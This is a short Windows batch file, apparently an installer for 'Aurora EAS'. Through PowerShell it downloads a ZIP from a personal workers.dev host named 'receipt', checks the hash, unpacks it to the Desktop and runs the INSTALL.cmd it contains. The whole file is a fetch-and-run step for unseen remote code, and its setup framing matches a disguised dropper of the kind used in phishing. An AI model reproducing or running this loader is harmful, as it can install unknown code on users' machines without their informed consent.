@echo off
setlocal
echo Downloading and verifying Aurora EAS setup...
powershell.exe -NoLogo -NoProfile -Command "$ErrorActionPreference='Stop'; $zip=Join-Path ([IO.Path]::GetTempPath()) ([guid]::NewGuid().ToString()+'.zip'); try { Invoke-WebRequest -UseBasicParsing -Uri 'https://receipt.sskim4912.workers.dev/downloads/aurora-eas-windows.zip' -OutFile $zip; if ((Get-FileHash -Algorithm SHA256 $zip).Hash -ne '11554ae3c013fc25de049dce05f7514435faf050945d21a63c2f68ffe1c191cf') { throw 'Installer version mismatch. Download the latest setup file from the portal.' }; $dest=Join-Path ([Environment]::GetFolderPath('Desktop')) ('AuroraEAS-Setup-'+[guid]::NewGuid().ToString('N')); Expand-Archive -LiteralPath $zip -DestinationPath $dest; Write-Host ('Setup folder: '+$dest); & (Join-Path $dest 'INSTALL.cmd'); exit $LASTEXITCODE } catch { Write-Host ('Setup failed: '+$_.Exception.Message); exit 1 } finally { Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue }"
if errorlevel 1 echo Setup did not complete. Try the ZIP download or contact your IT team.
pause
